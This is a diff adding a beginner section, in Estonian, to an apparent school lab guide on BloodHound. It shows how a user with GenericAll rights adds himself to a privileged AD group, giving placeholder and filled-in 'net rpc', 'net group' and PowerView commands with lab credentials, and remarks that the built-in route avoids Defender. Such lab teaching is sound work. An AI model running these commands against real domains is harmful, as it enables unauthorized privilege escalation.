@@ -121,6 +121,54 @@ Tüüpiline töövoog: paremklõps **Domain Adminsil → Shortest Paths to Here*
 
 **Soovitus laboriks:** iga leitud serva puhul ava Abuse Info ja loe, millise käsuga seda ründaks ning mis jälje see jätab. Just see ühendab „leidsin tee" ja „saan aru, kuidas ja mille vastu kaitsta".
 
+### 8.1 Näide algajale: `GenericAll` grupi üle (jaan.tamm → Serveri-Admins)
+
+Kui klõpsad serval `GenericAll` sõlmede `JAAN.TAMM` ja `SERVERI-ADMINS` vahel, näitab **Abuse Info** umbes sellist Linuxi/Samba näidet (**NB! need on üldised „placeholder'id", mitte valmis käsk**):
+
+```text
+net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+```
+
+**Mida õpilane näeb ja mida asendada.** BloodHound näitab ÜLDISI kohahoidjaid — pane nende asemele oma labori väärtused:
+
+| Kohahoidja aknas | Mis see on | Sinu laboris |
+|---|---|---|
+| `TargetGroup` | grupp, mille üle õigus on | `Serveri-Admins` |
+| `TargetUser` | keda gruppi lisada | `jaan.tamm` (ta ise) |
+| `DOMAIN` | domeeni **NetBIOS lühinimi** (mitte `hkhk.local`!) | `HKHK` |
+| `ControlledUser` | konto, mille mandaati kasutad | `jaan.tamm` |
+| `Password` | selle konto parool | `Suvi2026!` |
+| `DomainController` | DC IP või nimi | `10.0.30.10` või `SERVER.hkhk.local` |
+
+**NB:** need `net rpc` / `pth-net` käsud on **Kali/Linux** tööriistad (Samba `net`). Windowsis neid pole — vaata allpool Windowsi vastet.
+
+#### Variant 1 — Kalist (nagu aknas näidatud, täidetud)
+```bash
+net rpc group addmem "Serveri-Admins" "jaan.tamm" \
+  -U "HKHK"/"jaan.tamm"%"Suvi2026!" -S "10.0.30.10"
+
+# kontroll:
+net rpc group members "Serveri-Admins" -U "HKHK"/"jaan.tamm"%"Suvi2026!" -S "10.0.30.10"
+```
+
+#### Variant 2 — domeeniga liitunud Win11-lt, jaan.tamm'ina
+Masin on juba domeenis ja kasutaja autenditud, nii et **`DOMAIN`-välja ei kirjutata üldse**:
+```cmd
+:: sisseehitatud, ei vaja tööriistu ega jää Defenderi taha
+net group "Serveri-Admins" jaan.tamm /add /domain
+
+:: kontroll:
+net group "Serveri-Admins" /domain
+```
+(PowerView'ga: `Add-DomainGroupMember -Identity 'Serveri-Admins' -Members 'jaan.tamm'`.)
+
+**Tähtis mõlema puhul:** uus grupiliikmelisus jõustub alles **uues sisselogimises** — Kerberose pilet tehakse login'i ajal. Jaan peab pärast lisamist **välja/sisse logima**, et saada Domain Adminsi õigused. Kontroll pärast uut login'i:
+```cmd
+whoami /groups | findstr /i "Domain Admins"
+```
+
+Lokaalset admini Win11-l pole vaja — õigus on AD-s ja seda jõustab DC.
+
 ---
 
 ## 9. Cypher — valmis ja oma päringud
